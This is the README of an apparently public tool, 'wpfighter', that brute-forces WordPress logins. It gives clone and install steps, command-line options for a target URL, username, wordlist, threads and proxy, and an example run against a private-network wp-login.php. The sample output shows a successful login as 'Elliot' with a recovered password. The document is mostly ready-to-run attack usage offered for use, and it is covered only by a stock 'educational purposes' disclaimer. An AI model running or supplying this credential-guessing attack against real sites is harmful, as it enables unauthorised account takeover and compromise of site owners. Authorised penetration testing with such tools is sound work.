
## Wpfighter Wordpress Brute Force Tool

# Installation:
* Clone the repository or download the script.
* Make sure you have Python 3.x installed.
* run ```git clone https://github.com/DrW3b/wpfighter.git```
* run ```cd wpfighter```
* Install the required modules by running ```pip install -r requirements.txt.```

# Usage:
```
python3 wpfighter.py [options]

options:
  -h, --help        show this help message and exit
  -d, --debug       debugging mode

target arguments:
  -t , --target     url of the target
  -u , --username   username of the target (default: admin)
  -p , --password   password of the target (change -p to --p to use a wordlist)

  --timeout         timed out for requests (default: 5)
  --thread          numbers of threading (default: 5)
  --proxy           using a proxy (ex: 127.0.0.1:8080)
  ```
  # Example:
  ```
  python3 wpfighter.py -t http://192.168.178.32/wp-login.php -u Elliot --p wordlist/1000-most-common-passwords.txt

██╗    ██╗██████╗ ███████╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝█████╗  ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ██╔══╝  ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ██║     ██║╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ v.1.8

Coded by: DrW3B

Wordpress Brute Force Tool

Legal Disclaimer:
This script is for educational and testing purposes only. Do not use it for illegal activities.
The author is not responsible for any misuse or damage caused by this script. Use at your own risk.


[16:08:33][INFO] testing connection to the target
[16:08:33][INFO] starting a login brute force
[16:08:36][SUCCESS] successfully entered into the target dashboard with username "Elliot" and password "ER28-0652"
[16:08:36][INFO] time taken "3 seconds" 
  ```
  
## Legal Disclaimer:
This script is for educational and testing purposes only. Do not use it for illegal activities.
The author is not responsible for any misuse or damage caused by this script. Use at your own risk.
